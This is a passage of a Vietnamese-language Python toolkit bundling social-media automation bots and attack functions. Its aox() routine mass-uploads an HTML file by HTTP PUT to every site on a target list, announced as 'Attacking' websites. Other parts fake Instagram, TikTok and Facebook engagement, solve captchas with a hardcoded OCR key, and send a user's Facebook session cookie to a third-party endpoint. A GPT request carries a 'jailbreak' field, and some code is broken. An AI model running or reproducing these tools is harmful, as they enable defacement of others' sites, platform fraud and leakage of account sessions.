                'accept-encoding': 'gzip, deflate',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'accept-language': 'en-US,en;q=0.9',
                'Host': 'instahile.co',
                'sec-fetch-mode': 'navigate',
                'upgrade-insecure-requests': '1',
                'sec-fetch-user': '?1',
                'sec-fetch-dest': 'document',
            })
            response = r.get('https://instahile.co/login')
            r.headers.pop('sec-fetch-user');r.headers.pop('upgrade-insecure-requests')
            r.headers.update({
                'referer': 'https://instahile.co/login',
                'accept': '*/*',
                'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
                'sec-fetch-dest': 'empty',
                'content-type': 'application/x-www-form-urlencoded',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-mode': 'cors',
                'x-requested-with': 'XMLHttpRequest',
            })
            data = {
                'username': username,
                'password': password,
            }
            response2 = r.post('https://instahile.co/ajax/login', data = data)
            if '"error":false' in str(response2.text):
                print("\r                                                    ", end='\r')
                time.sleep(1.5)
                print(f"{xanhnhat}   ╰─>{xanh_la} ĐĂNG NHẬP THÀNH CÔNG...", end='\r')
                time.sleep(2.5)
                r.headers.pop('content-type');r.headers.pop('x-requested-with')
                r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'upgrade-insecure-requests': '1',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-user': '?1',
                    'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-mode': 'navigate',
                    'referer': 'https://instahile.co/tools/',
                })
                response3 = r.get('https://instahile.co/tools/send-likes')
                if 'Hesabınızı Instagram üzerinden doğrulayın ve tekrar giriş yapın.' in str(response3.text) or 'Giriş yap' in str(response3.text):
                    print(f"{do}Có vẻ như tài khoản Instagram của bạn đã bị Checkpoint!")
                    exit()
                r.headers.pop('sec-fetch-user');r.headers.pop('upgrade-insecure-requests')
                r.headers.update({
                    'origin': 'https://instahile.co',
                    'sec-fetch-dest': 'empty',
                    'content-type': 'application/x-www-form-urlencoded',
                    'sec-fetch-site': 'same-origin',
                    'referer': 'https://instahile.co/tools/send-likes',
                    'sec-fetch-mode': 'cors',
                    'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
                })
                data = {
                    'link': your_links,
                }
                response4 = r.post('https://instahile.co/tools/send-likes', data = data)
                if 'name="media_id"' in str(response4.text):
                    self.media_id = re.search('name="media_id" value="(.*?)"', str(response4.text)).group(1)
                    if '_' in str(self.media_id):
                        self.media_ids = (self.media_id.split('_')[0])
                    else:
                        self.media_ids = (self.media_id)
                    self.jumlah_likes = 0
                    for _ in ['1', '2', '3', '4', '5', '6', '7', '8', '9', '10']:
                        r.headers.update({
                            'x-requested-with': 'XMLHttpRequest',
                            'accept': '*/*',
                            'cookie': "; ".join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]),
                        })
                        data = {
                            'media_id': self.media_id,
                            'quantity': '10',
                        }
                        response5 = r.post('https://instahile.co/ajax/tools/send_likes', data = data)
                        if '"error":false' in str(response5.text):
                            self.json_response = json.loads(response5.text)
                            self.credi, self.sent = self.json_response['credi'], self.json_response['sent']
                            if int(self.credi) == 0:
                                print("\r                                                    ", end='\r')
                                time.sleep(1.5)
                                print(f"{xanhnhat}   ╰─>{do} Bạn đã hết lượt tim...", end='\r')
                                time.sleep(2.5)
                                return ("Likes Limit", self.media_ids)
                            else:
                                self.jumlah_likes += int(self.sent)
                                Jumlah.update({
                                    "Count": self.jumlah_likes
                                })
                                continue
                        elif '"error":true' in str(response5.text):
                            if 'Beğeni Eklenemedi' in str(json.loads(response5.text)):
                                print("\r                                                    ", end='\r')
                                time.sleep(1.5)
                                print(f"{xanhnhat}   ╰─>{do} KHÔNG THÊM LƯỢT THÍCH...", end='\r')
                                time.sleep(4.5)
                                return ("Likes Limit", self.media_ids)
                            else:
                                print("\r                                                    ", end='\r')
                                Gagal.append(response5.text)
                                time.sleep(1.5)
                                print(f"{xanhnhat}   ╰─>[bold yellow] KHÔNG NHẬN ĐƯỢC LƯỢT THÍCH...", end='\r')
                                time.sleep(4.5)
                                return ("Likes Gagal", self.media_ids)
                        else:
                            print("\r                                                    ", end='\r')
                            Gagal.append(response5.text)
                            time.sleep(1.5)
                            print(f"{xanhnhat}   ╰─>{do} KHÔNG NHẬN ĐƯỢC LƯỢT THÍCH...", end='\r')
                            time.sleep(4.5)
                            return ("Likes Gagal", self.media_ids)
                    return ("Likes Sukses", f'@{username}')
                else:
                    print("\r                                                    ", end='\r')
                    time.sleep(1.5)
                    print(f"{xanhnhat}   ╰─>{do} KHÔNG TÌM THẤY BÀI VIẾT...", end='\r')
                    time.sleep(4.5)
                    return ("Không tìm thấy bài viết", f'@{username}')
            else:
                print("\r                                                    ", end='\r')
                time.sleep(1.5)
                print(f"{xanhnhat}   ╰─>{do} ĐĂNG NHẬP KHÔNG THÀNH CÔNG...", end='\r')
                time.sleep(4.5)
                return ("Login Gagal", f'@{username}')
            
    def Delay(self, menit, detik, username):
        self.total = (menit * 60 + detik)
        while (self.total):
            menit, detik = divmod(self.total, 60)
            print(f"{xanhnhat}   ╰─>{xanh_la} {str(username)[:20]}{trang}/{xanh_la}{menit:02d}:{detik:02d}{trang} Sukses:-{xanh_la}{len(Sukses)}{trang} Gagal:-{do}{len(Gagal)}     ", end='\r')
            time.sleep(1)
            self.total -= 1
        return ("Delay SUCCESSFUL")

#=====================================================================================================================================================================================
#==========================================================================================================

#==============================================================================================================================================================================


b = '\033[31m'
h = '\033[32m'
m = '\033[00m'

def aox(script,target_file="listsite.txt"):
   op = open(script,"r").read()
   with open(target_file, "r") as target:
      target = target.readlines()
      s = requests.Session()
      print("\033[92mAttacking to %d Website."%(len(target)))
      for web in target:
         try:
            site = web.strip()
            if site.startswith("http://") is False:
               site = "http://" + site
            req = s.put(site+"/"+script,data=op)
            if req.status_code == 200 and requests.get(f"{site}/{script}").text == open(script, "r").read():
               print(m+"\033[0m ["+h+" DONE"+m+" ] %s/%s"%(site,script))
            else:
               print(m+"\033[0m ["+b+" FAILED!"+m+" ] %s/%s"%(site,script))

         except requests.exceptions.RequestException:
            continue
         except KeyboardInterrupt:
            print; exit()

def main(__bn__):
   clear()
   runbanner(__bn__)
   while True:
      try:
         a = input(f"{dac_biet}Vui Lòng điền file html chứa script của bạn (VD:index.html):{vang} ")
         if not os.path.isfile(a):
            print("file '%s' not found"%(a))
            continue
         else:
            break
      except KeyboardInterrupt:
         print; exit()

   aox(a)
#==============================================================================================================================================================================

#==============================================================================================================================================================================
import threading
class Zefoy:
  # if os.path.exists('config.json') is False: open('config.json','w',encoding='utf-8',errors='ignore').write(json.dumps({'url':'https://www.tiktok.com/t/ZTRToxYct','service':'Views'},indent=4))

  def __init__(self):
    self.base_url = 'https://zefoy.com/'
    self.headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
    self.session = requests.Session()
    self.captcha_1 = None
    self.captcha_ = {}
    self.service = 'Views'
    self.video_key = None
    self.services = {}
    self.services_ids = {}
    self.services_status = {}
    self.url = 'None'
    self.text = 'vLong Dec'
    url1= input(f"{dac_biet}Nhập link video: {vang}")
    self.url=url1

  def get_captcha(self):
    if os.path.exists('session'): self.session.cookies.set("PHPSESSID", open('session',encoding='utf-8').read(), domain='zefoy.com')
    request = self.session.get(self.base_url, headers=self.headers)
    if 'Enter Video URL' in request.text: self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]; return True

    try:
      for x in re.findall(r'<input type="hidden" name="(.*)" value="(.*)">', request.text): self.captcha_[x[0]] = x[1]

      self.captcha_1 = request.text.split('type="text" name="')[1].split('" oninput="this.value=this.value.toLowerCase()"')[0]
      captcha_url = request.text.split('<img src="')[1].split('" onerror="imgOnError()" class="')[0]
      request = self.session.get(f"{self.base_url}{captcha_url}",headers=self.headers)
      open('captcha.png', 'wb').write(request.content)
      print(f'{tim}Đang giải capcha..')
      return False
    except Exception as e:
      print(f"{do}Không thể giải captcha: {e}")
      time.sleep(2)
      self.get_captcha()

  def send_captcha(self, new_session = False):
    if new_session: self.session = requests.Session(); os.remove('session'); time.sleep(2)
    if self.get_captcha(): print(f'{xanh_la}Đang kêt nối đến session');return (True, 'The session already exists')
    captcha_solve = self.solve_captcha('captcha.png')[1]
    self.captcha_[self.captcha_1] = captcha_solve
    request = self.session.post(self.base_url, headers=self.headers, data=self.captcha_)

    if 'Enter Video URL' in request.text: 
      print(f'{xanh_la}Session đã được tạo')
      open('session','w',encoding='utf-8').write(self.session.cookies.get('PHPSESSID'))
      print(f"{xanh_la}Giải capcha thành công: {captcha_solve}")
      self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]
      return (True,captcha_solve)
    else: return (False,captcha_solve)

  def solve_captcha(self, path_to_file = None, b64 = None, delete_tag = ['\n','\r']):
    if path_to_file: task = path_to_file
    else: open('temp.png','wb').write(base64.b64decode(b64)); task = 'temp.png'
    request = self.session.post('https://api.ocr.space/parse/image?K87899142388957', headers={'apikey':'K87899142388957'}, files={'task':open(task,'rb')}).json()
    solved_text = request['ParsedResults'][0]['ParsedText']
    for x in delete_tag: solved_text = solved_text.replace(x,'')
    return (True, solved_text)

  def get_status_services(self):
    request = self.session.get(self.base_url, headers=self.headers).text
    for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+\n.+', request): self.services[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = x.split('d-sm-inline-block">')[1].split('</small>')[0].strip()
    for x in re.findall(r'<h5 class="card-title mb-3">.+</h5>\n<form action=".+">', request): self.services_ids[x.split('title mb-3">')[1].split('<')[0].strip()] = x.split('<form action="')[1].split('">')[0].strip()
    for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+<button .+', request): self.services_status[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = False if 'disabled class' in x else True
    return (self.services, self.services_status)

  def get_table(self, i = 1):
    table = PrettyTable(field_names=["ID", "DỊCH VỤ", "Status"], title="Status Services", header_style="upper",border=True)
    while True:
      if len(self.get_status_services()[0])>1:break
      else:print('Cant get services, retrying...');self.send_captcha();time.sleep(2)
    for service in self.services: table.add_row([f"{Fore.CYAN}{i}{Fore.RESET}", service, f"{Fore.GREEN if 'ago updated' in self.services[service] else Fore.RED}{self.services[service]}{Fore.RESET}"]); i+=1
    table.title =  f"{Fore.YELLOW}Số Dịch Vụ Hoạt Động: {len([x for x in self.services_status if self.services_status[x]])}{Fore.RESET}"
    print(table)

  def find_video(self):
    if self.service is None: return (False, "You didn't choose the service")
    while True:
      if self.service not in self.services_ids: self.get_status_services(); time.sleep(1)
      request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':'multipart/form-data; boundary=----WebKitFormBoundary0nU8PjANC8BhQgjZ', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary0nU8PjANC8BhQgjZ\r\nContent-Disposition: form-data; name="{self.video_key}"\r\n\r\n{self.url}\r\n------WebKitFormBoundary0nU8PjANC8BhQgjZ--\r\n')
      try: self.video_info = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
      except: time.sleep(3); continue
      if 'Session expired. Please re-login' in self.video_info: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha(); return
      elif 'service is currently not working' in self.video_info: return (True,'Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
      elif """onsubmit="showHideElements""" in self.video_info:
        self.video_info = [self.video_info.split('" name="')[1].split('"')[0],self.video_info.split('value="')[1].split('"')[0]]
        return (True, request.text)
      elif 'Checking Timer...' in self.video_info:
        try: 
          t=int(re.findall(r'ltm=(\d*);', self.video_info)[0])
          lamtilo = int(re.findall(r'ltm=(\d*);', self.video_info)[0])
        except: 
          return (False,)
        if lamtilo==0:self.find_video()
        elif lamtilo >= 1000: print(f'{do}Your IP was banned')
        _=time.time()
        while time.time()-2<_+lamtilo:
          t-=1
          print("Vui lòng chờ: {0} ".format(t)+"giây .", end="\r")
          time.sleep(1)
          
        continue
      elif 'Too many requests. Please slow' in self.video_info: time.sleep(3)
      else: print(self.video_info)

  def use_service(self):
    if self.find_video()[0] is False: return False
    self.token = "".join(random.choices(ascii_letters+digits, k=16))
    request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':f'multipart/form-data; boundary=----WebKitFormBoundary{self.token}', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary{self.token}\r\nContent-Disposition: form-data; name="{self.video_info[0]}"\r\n\r\n{self.video_info[1]}\r\n------WebKitFormBoundary{self.token}--\r\n')
    try: res = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
    except: time.sleep(3); return ""
    if 'Session expired. Please re-login' in res: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha(); return ""
    elif 'Too many requests. Please slow' in res: time.sleep(3)
    elif 'service is currently not working' in res: return ('Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
    else: print(res.split("sans-serif;text-align:center;color:green;'>")[1].split("</")[0])

  def get_video_info(self):
    request = self.session.get(f'https://tiktok.livecounts.io/video/stats/{urlparse(self.url).path.rpartition("/")[2]}',headers={'authority':'tiktok.livecounts.io','origin':'https://livecounts.io','user-agent':self.headers['user-agent']}).json()
    if 'viewCount' in request: return request
    else: return {'viewCount':0, 'likeCount':0,'commentCount':0,'shareCount':0}

  def get_video_id(self, url_ = None, set_url=True):
    if url_ is None: url_ = self.url
    if url_[-1] == '/': url_=url_[:-1]
    url = urlparse(url_).path.rpartition('/')[2]
    if url.isdigit(): self.url = url_; return url_
    request = requests.get(f'https://api.tokcount.com/?type=videoID&username=https://vm.tiktok.com/{url}',headers={'origin': 'https://tokcount.com','authority': 'api.tokcount.com','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'})
    if request.text == '': print(f'{do}Link video không hợp lệ'); return False
    else: json_=request.json()
    if 'author' not in json_: print(f'{do}{self.url}| Link video không hợp lệ'); return False
    if set_url: self.url = f'https://www.tiktok.com/@{json_["author"]}/video/{json_["id"]}';print(f'Formated video url --> {self.url}')
    return request.text

  def check_config(self):
    
    while True:
      try: 
        last_url = self.url
        if last_url != self.url: self.get_video_id()
      except Exception as e: print(e)
      time.sleep(4)
  def update_name(self):
    while True:
      try:
        ctypes.windll.kernel32.SetConsoleTitleA(self.text.encode())
        video_info = self.get_video_info()
        self.text = f"{xanh_la}Views: {video_info['viewCount']} "
      except: pass
      time.sleep(5)

#==============================================================================================================================================================================
#==========================================================================================================================================================================================
class Zefoy2:
  # if os.path.exists('config.json') is False: open('config.json','w',encoding='utf-8',errors='ignore').write(json.dumps({'url':'https://www.tiktok.com/t/ZTRToxYct','service':'Hearts'},indent=4))

  def __init__(self):
    self.base_url = 'https://zefoy.com/'
    self.headers = {'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
    self.session = requests.Session()
    self.captcha_1 = None
    self.captcha_ = {}
    self.service = 'Hearts'
    self.video_key = None
    self.services = {}
    self.services_ids = {}
    self.services_status = {}
    self.url = 'None'
    url1=input(f"{dac_biet}Nhập link video: {vang}")
    self.url=url1

  def get_captcha2(self):
    if os.path.exists('session'): self.session.cookies.set("PHPSESSID", open('session',encoding='utf-8').read(), domain='zefoy.com')
    request = self.session.get(self.base_url, headers=self.headers)
    if 'Enter Video URL' in request.text: self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]; return True

    try:
      for x in re.findall(r'<input type="hidden" name="(.*)" value="(.*)">', request.text): self.captcha_[x[0]] = x[1]

      self.captcha_1 = request.text.split('type="text" name="')[1].split('" oninput="this.value=this.value.toLowerCase()"')[0]
      captcha_url = request.text.split('<img src="')[1].split('" onerror="imgOnError()" class="')[0]
      request = self.session.get(f"{self.base_url}{captcha_url}",headers=self.headers)
      open('captcha.png', 'wb').write(request.content)
      print(f'{tim}Đang giải capcha..')
      return False
    except Exception as e:
      print(f"{do}Không thể giải captcha: {e}")
      time.sleep(2)
      self.get_captcha2()

  def send_captcha2(self, new_session = False):
    if new_session: self.session = requests.Session(); os.remove('session'); time.sleep(2)
    if self.get_captcha2(): print(f'{xanh_la}Đang kêt nối đến session');return (True, 'The session already exists')
    captcha_solve = self.solve_captcha('captcha.png')[1]
    self.captcha_[self.captcha_1] = captcha_solve
    request = self.session.post(self.base_url, headers=self.headers, data=self.captcha_)

    if 'Enter Video URL' in request.text: 
      print(f'{xanh_la}Session đã được tạo')
      open('session','w',encoding='utf-8').write(self.session.cookies.get('PHPSESSID'))
      print(f"{xanh_la}Giải capcha thành công: {captcha_solve}")
      self.video_key = request.text.split('" placeholder="Enter Video URL"')[0].split('name="')[-1]
      return (True,captcha_solve)
    else: return (False,captcha_solve)

  def solve_captcha2(self, path_to_file = None, b64 = None, delete_tag = ['\n','\r']):
    if path_to_file: task = path_to_file
    else: open('temp.png','wb').write(base64.b64decode(b64)); task = 'temp.png'
    request = self.session.post('https://api.ocr.space/parse/image?K87899142388957', headers={'apikey':'K87899142388957'}, files={'task':open(task,'rb')}).json()
    solved_text = request['ParsedResults'][0]['ParsedText']
    for x in delete_tag: solved_text = solved_text.replace(x,'')
    return (True, solved_text)

  def get_status_services2(self):
    request = self.session.get(self.base_url, headers=self.headers).text
    for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+\n.+', request): self.services[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = x.split('d-sm-inline-block">')[1].split('</small>')[0].strip()
    for x in re.findall(r'<h5 class="card-title mb-3">.+</h5>\n<form action=".+">', request): self.services_ids[x.split('title mb-3">')[1].split('<')[0].strip()] = x.split('<form action="')[1].split('">')[0].strip()
    for x in re.findall(r'<h5 class="card-title">.+</h5>\n.+<button .+', request): self.services_status[x.split('<h5 class="card-title">')[1].split('<')[0].strip()] = False if 'disabled class' in x else True
    return (self.services, self.services_status)

  def find_video2(self):
    if self.service is None: return (False, "You didn't choose the service")
    while True:
      if self.service not in self.services_ids: self.get_status_services(); time.sleep(1)
      request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':'multipart/form-data; boundary=----WebKitFormBoundary0nU8PjANC8BhQgjZ', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary0nU8PjANC8BhQgjZ\r\nContent-Disposition: form-data; name="{self.video_key}"\r\n\r\n{self.url}\r\n------WebKitFormBoundary0nU8PjANC8BhQgjZ--\r\n')
      try: self.video_info = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
      except: time.sleep(3); continue
      if 'Session expired. Please re-login' in self.video_info: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha2(); return
      elif 'service is currently not working' in self.video_info: return (True,'Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
      elif """onsubmit="showHideElements""" in self.video_info:
        self.video_info = [self.video_info.split('" name="')[1].split('"')[0],self.video_info.split('value="')[1].split('"')[0]]
        return (True, request.text)
      elif 'Checking Timer...' in self.video_info:
        try: 
          t=int(re.findall(r'ltm=(\d*);', self.video_info)[0])
          lamtilo = int(re.findall(r'ltm=(\d*);', self.video_info)[0])
        except: 
          return (False,)
        if lamtilo==0:self.find_video()
        elif lamtilo >= 1000: print(f'{do}Your IP was banned')
        _=time.time()
        while time.time()-2<_+lamtilo:
          t-=1
          print("Vui lòng chờ: {0} ".format(t)+"giây .", end="\r")
          time.sleep(1)
          
        continue
      elif 'Too many requests. Please slow' in self.video_info: time.sleep(3)
      else: print(self.video_info)

  def use_service2(self):
    if self.find_video()[0] is False: return False
    self.token = "".join(random.choices(ascii_letters+digits, k=16))
    request = self.session.post(f'{self.base_url}{self.services_ids[self.service]}', headers={'content-type':f'multipart/form-data; boundary=----WebKitFormBoundary{self.token}', 'user-agent':self.headers['user-agent'], 'origin':'https://zefoy.com'}, data=f'------WebKitFormBoundary{self.token}\r\nContent-Disposition: form-data; name="{self.video_info[0]}"\r\n\r\n{self.video_info[1]}\r\n------WebKitFormBoundary{self.token}--\r\n')
    try: res = base64.b64decode(unquote(request.text.encode()[::-1])).decode()
    except: time.sleep(3); return ""
    if 'Session expired. Please re-login' in res: print(f'{do}Phiên hết hạn. Đang đăng nhập lại...');self.send_captcha2(); return ""
    elif 'Too many requests. Please slow' in res: time.sleep(3)
    elif 'service is currently not working' in res: return ('Dịch vụ hiện không hoạt động, hãy thử lại sau. | Bạn có thể thay đổi nó trong cấu hình.')
    else: print(res.split("sans-serif;text-align:center;color:green;'>")[1].split("</")[0])

  def get_video_info2(self):
    request = self.session.get(f'https://tiktok.livecounts.io/video/stats/{urlparse(self.url).path.rpartition("/")[2]}',headers={'authority':'tiktok.livecounts.io','origin':'https://livecounts.io','user-agent':self.headers['user-agent']}).json()
    if 'likeCount' in request: return request
    else: return {'viewCount':0, 'likeCount':0,'commentCount':0,'shareCount':0}

  def get_video_id2(self, url_ = None, set_url=True):
    if url_ is None: url_ = self.url
    if url_[-1] == '/': url_=url_[:-1]
    url = urlparse(url_).path.rpartition('/')[2]
    if url.isdigit(): self.url = url_; return url_
    request = requests.get(f'https://api.tokcount.com/?type=videoID&username=https://vm.tiktok.com/{url}',headers={'origin': 'https://tokcount.com','authority': 'api.tokcount.com','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'})
    if request.text == '': print(f'{do}Link video không hợp lệ'); return False
    else: json_=request.json()
    if 'author' not in json_: print(f'{do}{self.url}| Link video không hợp lệ'); return False
    if set_url: self.url = f'https://www.tiktok.com/@{json_["author"]}/video/{json_["id"]}';print(f'Formated video url --> {self.url}')
    return request.text

  def check_config2(self):
    
    while True:
      try: 
        last_url = self.url
        if last_url != self.url: self.get_video_id()
      except Exception as e: print(e)
      time.sleep(4)
  def update_name2(self):
    while True:
      try:
        ctypes.windll.kernel32.SetConsoleTitleA(self.text.encode())
        video_info = self.get_video_info()
        self.text = f"{xanh_la}Hearts: {like_info['likeCount']} "
      except: pass
      time.sleep(5)
#===========================================================================================================================================================================================
#====================================================================================================================================================================================================
def dao_proxy():

  loai = input(f"{tim}Nhập Loại Proxies:{vang} ")

  so = input(f"{xanh_duong}Nhập Số Lượng Proxies:{vang} ")
  luu = input(f"{xanh_duong}Nhập File Lưu Proxies:{vang} ")
  params = {
      'request': 'displayproxies',
      'protocol': loai,
      'timeout': so,
      'country': 'all',
      'ssl': 'all',
      'anonymity': 'all',
  }

  response = requests.get('https://api.proxyscrape.com/v2/', params=params).text
  print(response)
  open(luu,'a').write(response)

#===============================================================================================================================================================
#=======================================================================================================================================================================
def gpt():
  while True:
    tin_nhan = input(f"\033[1;97m[\033[1;31m</>\033[1;97m] {dac_biet}Nhập câu hỏi:{vang} ")
    cookies = {
      'cf_clearance': 'NEZQ1QSKgBji1Z1dnyAP5sGYQdWVYF9gSekUXBBvnVI-1693904813-0-1-169b5711.71a874ae.42e6ad0d-0.2.1693904813',
    }

    headers = {
      'authority': 'chats.ducknha.shop',
      'accept': 'text/event-stream',
      'accept-language': 'vi',
      'content-type': 'application/json',
      # 'cookie': 'cf_clearance=NEZQ1QSKgBji1Z1dnyAP5sGYQdWVYF9gSekUXBBvnVI-1693904813-0-1-169b5711.71a874ae.42e6ad0d-0.2.1693904813',
      'origin': 'https://chats.ducknha.shop',
      'referer': 'https://chats.ducknha.shop/chat/',
      'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Microsoft Edge";v="116"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
      'sec-fetch-mode': 'cors',
      'sec-fetch-site': 'same-origin',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62',
    }

    json_data = {
      'conversation_id': '926f1bfb-aba9-791b-7076-18a6498e6b0',
      'action': '_ask',
      'model': 'gpt-3.5-turbo',
      'jailbreak': 'default',
      'meta': {
          'id': '7275266082423121383',
          'content': {
              'conversation': [],
              'internet_access': False,
              'content_type': 'text',
              'parts': [
                  {
                      'content': tin_nhan,
                      'role': 'user',
                  },
              ],
         },
      },
    }

    response = requests.post('https://chats.ducknha.shop/backend-api/v2/conversation',cookies=cookies,headers=headers,json=json_data,).text    
    print(f"\033[1;97m[\033[1;31m</>\033[1;97m] {tim}CHAT-GPT SAID:{vang} ",response)
#========================================================================================================================================================================
#================================================================================================================================================================================
def like(head):
  link =requests.get("https://mbasic.facebook.com/",headers=head).url
  s=requests.get(link,headers=head).text
  check=re.findall('/a/like.php?.*?"',s)
  if check==[]:
    time.sleep(1)
  else:
    tcheck=check[0].replace('amp;','').replace('"','')
    like=requests.get("https://mbasic.facebook.com/"+tcheck,headers=head)
    idbv=re.findall('ft_ent_identifier=.*?&',tcheck)[0].replace("ft_ent_identifier=","").replace("&","")
    print(f"\033[1;97m[\033[1;31m✔\033[1;97m] {xanh_la}LIKE\033[1;31m-\033[1;97m[{tim}",idbv,"\033[1;97m")
def addfr(head):
  link =requests.get("https://mbasic.facebook.com/friends/center/mbasic/?fb_ref=tn&sr=1&ref_component=mbasic_home_header&ref_page=%2Fwap%2Fhome.php&refid=7",headers=head).url
  s=requests.get(link,headers=head).text
  check=re.findall('/a/mobile/friends/add_friend.php?.*?"',s)
  if check==[]:
    time.sleep(1)
  else:
    tcheck=check[0].replace('amp;','').replace('"','')
    like=requests.get("https://mbasic.facebook.com/"+tcheck,headers=head)
    idbv=re.findall('id=.*?&',tcheck)[0].replace("id=","").replace("&","")
    print(f"\033[1;97m[\033[1;31m✔\033[1;97m] {xanh_la}ADD_FRIENDS\033[1;31m-\033[1;97m[{tim}",idbv,"\033[1;97m]")
def jond(head):
  link =requests.get("https://mbasic.facebook.com/search/groups/?q=Freefire&source=filter&isTrending=0",headers=head).url
  s=requests.get(link,headers=head).text
  check=re.findall('/a/group/join/?.*?"',s)
  if check==[]:
    time.sleep(1)
  else:
    tcheck=check[0].replace('amp;','').replace('"','')
    like=requests.get("https://mbasic.facebook.com/"+tcheck,headers=head)
    idbv=re.findall('group_id=.*?&',tcheck)[0].replace("group_id=","").replace("&","")
    print(f"\033[1;97m[\033[1;31m✔\033[1;97m] {xanh_la}JOIN GROUP\033[1;31m-\033[1;97m[{tim}",idbv,"\033[1;97m]")
#===================================================================================================================================================================================

#============================================================================================================================================================================================
class reg_pro5:
    def getthongtinfacebook(self, cookie: str):
        headers_get = {'authority': 'www.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36','viewport-width': '1184','cookie': cookie}
        try:
            print(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanh_la}Đang Tiến Hành Check Live', end="\r")
            url_profile = requests.get('https://www.facebook.com/me', headers = headers_get).url
            get_dulieu_profile = requests.get(url = url_profile, headers = headers_get).text
        except:
            return False
        try:
            uid_get = cookie.split('c_user=')[1].split(';')[0]
            fb_dtsg_get = get_dulieu_profile.split('{"name":"fb_dtsg","value":"')[1].split('"},')[0]
            jazoest_get = get_dulieu_profile.split('{"name":"jazoest","value":"')[1].split('"},')[0]
            name_get = get_dulieu_profile.split('<title>')[1].split('</title>')[0]
            return name_get,uid_get,fb_dtsg_get,jazoest_get
        except:
            try:
                uid_get = cookie.split('c_user=')[1].split(';')[0]
                fb_dtsg_get = get_dulieu_profile.split(',"f":"')[1].split('","l":null}')[0]
                jazoest_get = get_dulieu_profile.split('&jazoest=')[1].split('","e":"')[0]
                name_get = get_dulieu_profile.split('<title>')[1].split('</title>')[0]
                return name_get,uid_get,fb_dtsg_get,jazoest_get
            except:
                return False
    def UpAvt(self, cookie, id_page, link_anh):
        sleep(5)
        try:
            json_upavt =  requests.get(f'https://api-ndpcutevcl.000webhostapp.com/api/upavtpage.php?cookie={cookie}&id={id_page}&link_anh={link_anh}').json()
            if json_upavt['status'] == 'success':
                return json_upavt
            else:
                return False
        except:
            return False
    def RegPage(self, cookie, name, uid, fb_dtsg, jazoest):
        namepage = requests.get('https://story-shack-cdn-v2.glitch.me/generators/vietnamese-name-generator/male?count=2').json()['data'][0]['name']
        global dem
